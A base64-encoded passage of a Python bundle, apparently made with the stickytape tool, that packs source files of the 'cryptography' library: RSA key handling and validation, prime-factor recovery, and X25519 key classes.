lXaXRoU2VyaWFsaXphdGlvbiA9IFJTQVB1YmxpY0tleVxyXG5cclxuXHJcbmRlZiBnZW5lcmF0ZV9wcml2YXRlX2tleShcclxuICAgIHB1YmxpY19leHBvbmVudDogaW50LFxyXG4gICAga2V5X3NpemU6IGludCxcclxuICAgIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lLFxyXG4pIC0+IFJTQVByaXZhdGVLZXk6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kIGFzIG9zc2xcclxuXHJcbiAgICBfdmVyaWZ5X3JzYV9wYXJhbWV0ZXJzKHB1YmxpY19leHBvbmVudCwga2V5X3NpemUpXHJcbiAgICByZXR1cm4gb3NzbC5nZW5lcmF0ZV9yc2FfcHJpdmF0ZV9rZXkocHVibGljX2V4cG9uZW50LCBrZXlfc2l6ZSlcclxuXHJcblxyXG5kZWYgX3ZlcmlmeV9yc2FfcGFyYW1ldGVycyhwdWJsaWNfZXhwb25lbnQ6IGludCwga2V5X3NpemU6IGludCkgLT4gTm9uZTpcclxuICAgIGlmIHB1YmxpY19leHBvbmVudCBub3QgaW4gKDMsIDY1NTM3KTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAicHVibGljX2V4cG9uZW50IG11c3QgYmUgZWl0aGVyIDMgKGZvciBsZWdhY3kgY29tcGF0aWJpbGl0eSkgb3IgIlxyXG4gICAgICAgICAgICAiNjU1MzcuIEFsbW9zdCBldmVyeW9uZSBzaG91bGQgY2hvb3NlIDY1NTM3IGhlcmUhIlxyXG4gICAgICAgIClcclxuXHJcbiAgICBpZiBrZXlfc2l6ZSA8IDUxMjpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJrZXlfc2l6ZSBtdXN0IGJlIGF0IGxlYXN0IDUxMi1iaXRzLiIpXHJcblxyXG5cclxuZGVmIF9jaGVja19wcml2YXRlX2tleV9jb21wb25lbnRzKFxyXG4gICAgcDogaW50LFxyXG4gICAgcTogaW50LFxyXG4gICAgcHJpdmF0ZV9leHBvbmVudDogaW50LFxyXG4gICAgZG1wMTogaW50LFxyXG4gICAgZG1xMTogaW50LFxyXG4gICAgaXFtcDogaW50LFxyXG4gICAgcHVibGljX2V4cG9uZW50OiBpbnQsXHJcbiAgICBtb2R1bHVzOiBpbnQsXHJcbikgLT4gTm9uZTpcclxuICAgIGlmIG1vZHVsdXMgPCAzOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIm1vZHVsdXMgbXVzdCBiZSA+PSAzLiIpXHJcblxyXG4gICAgaWYgcCA+PSBtb2R1bHVzOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoInAgbXVzdCBiZSA8IG1vZHVsdXMuIilcclxuXHJcbiAgICBpZiBxID49IG1vZHVsdXM6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigicSBtdXN0IGJlIDwgbW9kdWx1cy4iKVxyXG5cclxuICAgIGlmIGRtcDEgPj0gbW9kdWx1czpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJkbXAxIG11c3QgYmUgPCBtb2R1bHVzLiIpXHJcblxyXG4gICAgaWYgZG1xMSA+PSBtb2R1bHVzOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoImRtcTEgbXVzdCBiZSA8IG1vZHVsdXMuIilcclxuXHJcbiAgICBpZiBpcW1wID49IG1vZHVsdXM6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiaXFtcCBtdXN0IGJlIDwgbW9kdWx1cy4iKVxyXG5cclxuICAgIGlmIHByaXZhdGVfZXhwb25lbnQgPj0gbW9kdWx1czpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJwcml2YXRlX2V4cG9uZW50IG11c3QgYmUgPCBtb2R1bHVzLiIpXHJcblxyXG4gICAgaWYgcHVibGljX2V4cG9uZW50IDwgMyBvciBwdWJsaWNfZXhwb25lbnQgPj0gbW9kdWx1czpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJwdWJsaWNfZXhwb25lbnQgbXVzdCBiZSA+PSAzIGFuZCA8IG1vZHVsdXMuIilcclxuXHJcbiAgICBpZiBwdWJsaWNfZXhwb25lbnQgJiAxID09IDA6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigicHVibGljX2V4cG9uZW50IG11c3QgYmUgb2RkLiIpXHJcblxyXG4gICAgaWYgZG1wMSAmIDEgPT0gMDpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJkbXAxIG11c3QgYmUgb2RkLiIpXHJcblxyXG4gICAgaWYgZG1xMSAmIDEgPT0gMDpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJkbXExIG11c3QgYmUgb2RkLiIpXHJcblxyXG4gICAgaWYgcCAqIHEgIT0gbW9kdWx1czpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJwKnEgbXVzdCBlcXVhbCBtb2R1bHVzLiIpXHJcblxyXG5cclxuZGVmIF9jaGVja19wdWJsaWNfa2V5X2NvbXBvbmVudHMoZTogaW50LCBuOiBpbnQpIC0+IE5vbmU6XHJcbiAgICBpZiBuIDwgMzpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJuIG11c3QgYmUgPj0gMy4iKVxyXG5cclxuICAgIGlmIGUgPCAzIG9yIGUgPj0gbjpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJlIG11c3QgYmUgPj0gMyBhbmQgPCBuLiIpXHJcblxyXG4gICAgaWYgZSAmIDEgPT0gMDpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJlIG11c3QgYmUgb2RkLiIpXHJcblxyXG5cclxuZGVmIF9tb2RpbnYoZTogaW50LCBtOiBpbnQpIC0+IGludDpcclxuICAgICIiIlxyXG4gICAgTW9kdWxhciBNdWx0aXBsaWNhdGl2ZSBJbnZlcnNlLiBSZXR1cm5zIHggc3VjaCB0aGF0OiAoeCplKSBtb2QgbSA9PSAxXHJcbiAgICAiIiJcclxuICAgIHgxLCB4MiA9IDEsIDBcclxuICAgIGEsIGIgPSBlLCBtXHJcbiAgICB3aGlsZSBiID4gMDpcclxuICAgICAgICBxLCByID0gZGl2bW9kKGEsIGIpXHJcbiAgICAgICAgeG4gPSB4MSAtIHEgKiB4MlxyXG4gICAgICAgIGEsIGIsIHgxLCB4MiA9IGIsIHIsIHgyLCB4blxyXG4gICAgcmV0dXJuIHgxICUgbVxyXG5cclxuXHJcbmRlZiByc2FfY3J0X2lxbXAocDogaW50LCBxOiBpbnQpIC0+IGludDpcclxuICAgICIiIlxyXG4gICAgQ29tcHV0ZSB0aGUgQ1JUIChxICoqIC0xKSAlIHAgdmFsdWUgZnJvbSBSU0EgcHJpbWVzIHAgYW5kIHEuXHJcbiAgICAiIiJcclxuICAgIHJldHVybiBfbW9kaW52KHEsIHApXHJcblxyXG5cclxuZGVmIHJzYV9jcnRfZG1wMShwcml2YXRlX2V4cG9uZW50OiBpbnQsIHA6IGludCkgLT4gaW50OlxyXG4gICAgIiIiXHJcbiAgICBDb21wdXRlIHRoZSBDUlQgcHJpdmF0ZV9leHBvbmVudCAlIChwIC0gMSkgdmFsdWUgZnJvbSB0aGUgUlNBXHJcbiAgICBwcml2YXRlX2V4cG9uZW50IChkKSBhbmQgcC5cclxuICAgICIiIlxyXG4gICAgcmV0dXJuIHByaXZhdGVfZXhwb25lbnQgJSAocCAtIDEpXHJcblxyXG5cclxuZGVmIHJzYV9jcnRfZG1xMShwcml2YXRlX2V4cG9uZW50OiBpbnQsIHE6IGludCkgLT4gaW50OlxyXG4gICAgIiIiXHJcbiAgICBDb21wdXRlIHRoZSBDUlQgcHJpdmF0ZV9leHBvbmVudCAlIChxIC0gMSkgdmFsdWUgZnJvbSB0aGUgUlNBXHJcbiAgICBwcml2YXRlX2V4cG9uZW50IChkKSBhbmQgcS5cclxuICAgICIiIlxyXG4gICAgcmV0dXJuIHByaXZhdGVfZXhwb25lbnQgJSAocSAtIDEpXHJcblxyXG5cclxuIyBDb250cm9scyB0aGUgbnVtYmVyIG9mIGl0ZXJhdGlvbnMgcnNhX3JlY292ZXJfcHJpbWVfZmFjdG9ycyB3aWxsIHBlcmZvcm1cclxuIyB0byBvYnRhaW4gdGhlIHByaW1lIGZhY3RvcnMuIEVhY2ggaXRlcmF0aW9uIGluY3JlbWVudHMgYnkgMiBzbyB0aGUgYWN0dWFsXHJcbiMgbWF4aW11bSBhdHRlbXB0cyBpcyBoYWxmIHRoaXMgbnVtYmVyLlxyXG5fTUFYX1JFQ09WRVJZX0FUVEVNUFRTID0gMTAwMFxyXG5cclxuXHJcbmRlZiByc2FfcmVjb3Zlcl9wcmltZV9mYWN0b3JzKFxyXG4gICAgbjogaW50LCBlOiBpbnQsIGQ6IGludFxyXG4pIC0+IHR5cGluZy5UdXBsZVtpbnQsIGludF06XHJcbiAgICAiIiJcclxuICAgIENvbXB1dGUgZmFjdG9ycyBwIGFuZCBxIGZyb20gdGhlIHByaXZhdGUgZXhwb25lbnQgZC4gV2UgYXNzdW1lIHRoYXQgbiBoYXNcclxuICAgIG5vIG1vcmUgdGhhbiB0d28gZmFjdG9ycy4gVGhpcyBmdW5jdGlvbiBpcyBhZGFwdGVkIGZyb20gY29kZSBpbiBQeUNyeXB0by5cclxuICAgICIiIlxyXG4gICAgIyBTZWUgOC4yLjIoaSkgaW4gSGFuZGJvb2sgb2YgQXBwbGllZCBDcnlwdG9ncmFwaHkuXHJcbiAgICBrdG90ID0gZCAqIGUgLSAxXHJcbiAgICAjIFRoZSBxdWFudGl0eSBkKmUtMSBpcyBhIG11bHRpcGxlIG9mIHBoaShuKSwgZXZlbixcclxuICAgICMgYW5kIGNhbiBiZSByZXByZXNlbnRlZCBhcyB0KjJecy5cclxuICAgIHQgPSBrdG90XHJcbiAgICB3aGlsZSB0ICUgMiA9PSAwOlxyXG4gICAgICAgIHQgPSB0IC8vIDJcclxuICAgICMgQ3ljbGUgdGhyb3VnaCBhbGwgbXVsdGlwbGljYXRpdmUgaW52ZXJzZXMgaW4gWm4uXHJcbiAgICAjIFRoZSBhbGdvcml0aG0gaXMgbm9uLWRldGVybWluaXN0aWMsIGJ1dCB0aGVyZSBpcyBhIDUwJSBjaGFuY2VcclxuICAgICMgYW55IGNhbmRpZGF0ZSBhIGxlYWRzIHRvIHN1Y2Nlc3NmdWwgZmFjdG9yaW5nLlxyXG4gICAgIyBTZWUgIkRpZ2l0YWxpemVkIFNpZ25hdHVyZXMgYW5kIFB1YmxpYyBLZXkgRnVuY3Rpb25zIGFzIEludHJhY3RhYmxlXHJcbiAgICAjIGFzIEZhY3Rvcml6YXRpb24iLCBNLiBSYWJpbiwgMTk3OVxyXG4gICAgc3BvdHRlZCA9IEZhbHNlXHJcbiAgICBhID0gMlxyXG4gICAgd2hpbGUgbm90IHNwb3R0ZWQgYW5kIGEgPCBfTUFYX1JFQ09WRVJZX0FUVEVNUFRTOlxyXG4gICAgICAgIGsgPSB0XHJcbiAgICAgICAgIyBDeWNsZSB0aHJvdWdoIGFsbCB2YWx1ZXMgYV57dCoyXml9PWFea1xyXG4gICAgICAgIHdoaWxlIGsgPCBrdG90OlxyXG4gICAgICAgICAgICBjYW5kID0gcG93KGEsIGssIG4pXHJcbiAgICAgICAgICAgICMgQ2hlY2sgaWYgYV5rIGlzIGEgbm9uLXRyaXZpYWwgcm9vdCBvZiB1bml0eSAobW9kIG4pXHJcbiAgICAgICAgICAgIGlmIGNhbmQgIT0gMSBhbmQgY2FuZCAhPSAobiAtIDEpIGFuZCBwb3coY2FuZCwgMiwgbikgPT0gMTpcclxuICAgICAgICAgICAgICAgICMgV2UgaGF2ZSBmb3VuZCBhIG51bWJlciBzdWNoIHRoYXQgKGNhbmQtMSkoY2FuZCsxKT0wIChtb2QgbikuXHJcbiAgICAgICAgICAgICAgICAjIEVpdGhlciBvZiB0aGUgdGVybXMgZGl2aWRlcyBuLlxyXG4gICAgICAgICAgICAgICAgcCA9IGdjZChjYW5kICsgMSwgbilcclxuICAgICAgICAgICAgICAgIHNwb3R0ZWQgPSBUcnVlXHJcbiAgICAgICAgICAgICAgICBicmVha1xyXG4gICAgICAgICAgICBrICo9IDJcclxuICAgICAgICAjIFRoaXMgdmFsdWUgd2FzIG5vdCBhbnkgZ29vZC4uLiBsZXRcJ3MgdHJ5IGFub3RoZXIhXHJcbiAgICAgICAgYSArPSAyXHJcbiAgICBpZiBub3Qgc3BvdHRlZDpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJVbmFibGUgdG8gY29tcHV0ZSBmYWN0b3JzIHAgYW5kIHEgZnJvbSBleHBvbmVudCBkLiIpXHJcbiAgICAjIEZvdW5kICFcclxuICAgIHEsIHIgPSBkaXZtb2QobiwgcClcclxuICAgIGFzc2VydCByID09IDBcclxuICAgIHAsIHEgPSBzb3J0ZWQoKHAsIHEpLCByZXZlcnNlPVRydWUpXHJcbiAgICByZXR1cm4gKHAsIHEpXHJcblxyXG5cclxuY2xhc3MgUlNBUHJpdmF0ZU51bWJlcnM6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBwOiBpbnQsXHJcbiAgICAgICAgcTogaW50LFxyXG4gICAgICAgIGQ6IGludCxcclxuICAgICAgICBkbXAxOiBpbnQsXHJcbiAgICAgICAgZG1xMTogaW50LFxyXG4gICAgICAgIGlxbXA6IGludCxcclxuICAgICAgICBwdWJsaWNfbnVtYmVyczogIlJTQVB1YmxpY051bWJlcnMiLFxyXG4gICAgKTpcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIG5vdCBpc2luc3RhbmNlKHAsIGludClcclxuICAgICAgICAgICAgb3Igbm90IGlzaW5zdGFuY2UocSwgaW50KVxyXG4gICAgICAgICAgICBvciBub3QgaXNpbnN0YW5jZShkLCBpbnQpXHJcbiAgICAgICAgICAgIG9yIG5vdCBpc2luc3RhbmNlKGRtcDEsIGludClcclxuICAgICAgICAgICAgb3Igbm90IGlzaW5zdGFuY2UoZG1xMSwgaW50KVxyXG4gICAgICAgICAgICBvciBub3QgaXNpbnN0YW5jZShpcW1wLCBpbnQpXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlJTQVByaXZhdGVOdW1iZXJzIHAsIHEsIGQsIGRtcDEsIGRtcTEsIGlxbXAgYXJndW1lbnRzIG11c3QiXHJcbiAgICAgICAgICAgICAgICAiIGFsbCBiZSBhbiBpbnRlZ2Vycy4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocHVibGljX251bWJlcnMsIFJTQVB1YmxpY051bWJlcnMpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiUlNBUHJpdmF0ZU51bWJlcnMgcHVibGljX251bWJlcnMgbXVzdCBiZSBhbiBSU0FQdWJsaWNOdW1iZXJzIlxyXG4gICAgICAgICAgICAgICAgIiBpbnN0YW5jZS4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fcCA9IHBcclxuICAgICAgICBzZWxmLl9xID0gcVxyXG4gICAgICAgIHNlbGYuX2QgPSBkXHJcbiAgICAgICAgc2VsZi5fZG1wMSA9IGRtcDFcclxuICAgICAgICBzZWxmLl9kbXExID0gZG1xMVxyXG4gICAgICAgIHNlbGYuX2lxbXAgPSBpcW1wXHJcbiAgICAgICAgc2VsZi5fcHVibGljX251bWJlcnMgPSBwdWJsaWNfbnVtYmVyc1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHAoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3FcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBkKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGRtcDEoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9kbXAxXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZG1xMShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2RtcTFcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBpcW1wKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5faXFtcFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHB1YmxpY19udW1iZXJzKHNlbGYpIC0+ICJSU0FQdWJsaWNOdW1iZXJzIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcHVibGljX251bWJlcnNcclxuXHJcbiAgICBkZWYgcHJpdmF0ZV9rZXkoc2VsZiwgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUpIC0+IFJTQVByaXZhdGVLZXk6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgKFxyXG4gICAgICAgICAgICBiYWNrZW5kIGFzIG9zc2wsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gb3NzbC5sb2FkX3JzYV9wcml2YXRlX251bWJlcnMoc2VsZilcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIFJTQVByaXZhdGVOdW1iZXJzKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIHNlbGYucCA9PSBvdGhlci5wXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLnEgPT0gb3RoZXIucVxyXG4gICAgICAgICAgICBhbmQgc2VsZi5kID09IG90aGVyLmRcclxuICAgICAgICAgICAgYW5kIHNlbGYuZG1wMSA9PSBvdGhlci5kbXAxXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLmRtcTEgPT0gb3RoZXIuZG1xMVxyXG4gICAgICAgICAgICBhbmQgc2VsZi5pcW1wID09IG90aGVyLmlxbXBcclxuICAgICAgICAgICAgYW5kIHNlbGYucHVibGljX251bWJlcnMgPT0gb3RoZXIucHVibGljX251bWJlcnNcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaChcclxuICAgICAgICAgICAgKFxyXG4gICAgICAgICAgICAgICAgc2VsZi5wLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5xLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5kLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5kbXAxLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5kbXExLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5pcW1wLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5wdWJsaWNfbnVtYmVycyxcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIClcclxuXHJcblxyXG5jbGFzcyBSU0FQdWJsaWNOdW1iZXJzOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGU6IGludCwgbjogaW50KTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShlLCBpbnQpIG9yIG5vdCBpc2luc3RhbmNlKG4sIGludCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiUlNBUHVibGljTnVtYmVycyBhcmd1bWVudHMgbXVzdCBiZSBpbnRlZ2Vycy4iKVxyXG5cclxuICAgICAgICBzZWxmLl9lID0gZVxyXG4gICAgICAgIHNlbGYuX24gPSBuXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2VcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBuKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fblxyXG5cclxuICAgIGRlZiBwdWJsaWNfa2V5KHNlbGYsIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lKSAtPiBSU0FQdWJsaWNLZXk6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgKFxyXG4gICAgICAgICAgICBiYWNrZW5kIGFzIG9zc2wsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gb3NzbC5sb2FkX3JzYV9wdWJsaWNfbnVtYmVycyhzZWxmKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8UlNBUHVibGljTnVtYmVycyhlPXswLmV9LCBuPXswLm59KT4iLmZvcm1hdChzZWxmKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgUlNBUHVibGljTnVtYmVycyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5lID09IG90aGVyLmUgYW5kIHNlbGYubiA9PSBvdGhlci5uXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCgoc2VsZi5lLCBzZWxmLm4pKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL19hc3ltbWV0cmljLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuaW1wb3J0IGFiY1xyXG5cclxuXHJcbiMgVGhpcyBleGlzdHMgdG8gYnJlYWsgYW4gaW1wb3J0IGN5Y2xlLiBJdCBpcyBub3JtYWxseSBhY2Nlc3NpYmxlIGZyb20gdGhlXHJcbiMgYXN5bW1ldHJpYyBwYWRkaW5nIG1vZHVsZS5cclxuXHJcblxyXG5jbGFzcyBBc3ltbWV0cmljUGFkZGluZyhtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgbmFtZShzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQSBzdHJpbmcgbmFtaW5nIHRoaXMgcGFkZGluZyAoZS5nLiAiUFNTIiwgIlBLQ1MxIikuXHJcbiAgICAgICAgIiIiXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L3ByaW1pdGl2ZXMvYXN5bW1ldHJpYy94MjU1MTkucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGFiY1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuZXhjZXB0aW9ucyBpbXBvcnQgVW5zdXBwb3J0ZWRBbGdvcml0aG0sIF9SZWFzb25zXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzIGltcG9ydCBfc2VyaWFsaXphdGlvblxyXG5cclxuXHJcbmNsYXNzIFgyNTUxOVB1YmxpY0tleShtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZnJvbV9wdWJsaWNfYnl0ZXMoY2xzLCBkYXRhOiBieXRlcykgLT4gIlgyNTUxOVB1YmxpY0tleSI6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuICAgICAgICBpZiBub3QgYmFja2VuZC54MjU1MTlfc3VwcG9ydGVkKCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIlgyNTUxOSBpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoaXMgdmVyc2lvbiBvZiBPcGVuU1NMLiIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9FWENIQU5HRV9BTEdPUklUSE0sXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgcmV0dXJuIGJhY2tlbmQueDI1NTE5X2xvYWRfcHVibGljX2J5dGVzKGRhdGEpXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBfc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IF9zZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIHNlcmlhbGl6ZWQgYnl0ZXMgb2YgdGhlIHB1YmxpYyBrZXkuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuY2xhc3MgWDI1NTE5UHJpdmF0ZUtleShtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZ2VuZXJhdGUoY2xzKSAtPiAiWDI1NTE5UHJpdmF0ZUtleSI6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuICAgICAgICBpZiBub3QgYmFja2VuZC54MjU1MTlfc3VwcG9ydGVkKCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIlgyNTUxOSBpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoaXMgdmVyc2lvbiBvZiBPcGVuU1NMLiIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9FWENIQU5HRV9BTEdPUklUSE0sXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICByZXR1cm4gYmFja2VuZC54MjU1MTlfZ2VuZXJhdGVfa2V5KClcclxuXHJcbiAgICBAY2xhc3NtZXRob2RcclxuICAgIGRlZiBmcm9tX3ByaXZhdGVfYnl0ZXMoY2xzLCBkYXRhOiBieXRlcykgLT4gIlgyNTUxOVByaXZhdGVLZXkiOlxyXG4gICAgICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmRcclxuXHJcbiAgICAgICAgaWYgbm90IGJhY2tlbmQueDI1NTE5X3N1cHBvcnRlZCgpOlxyXG4gICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJYMjU1MTkgaXMgbm90IHN1cHBvcnRlZCBieSB0aGlzIHZlcnNpb24gb2YgT3BlblNTTC4iLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfRVhDSEFOR0VfQUxHT1JJVEhNLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBiYWNrZW5kLngyNTUxOV9sb2FkX3ByaXZhdGVfYnl0ZXMoZGF0YSlcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiBYMjU1MTlQdWJsaWNLZXk6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIHNlcmlhbGl6ZWQgYnl0ZXMgb2YgdGhlIHB1YmxpYyBr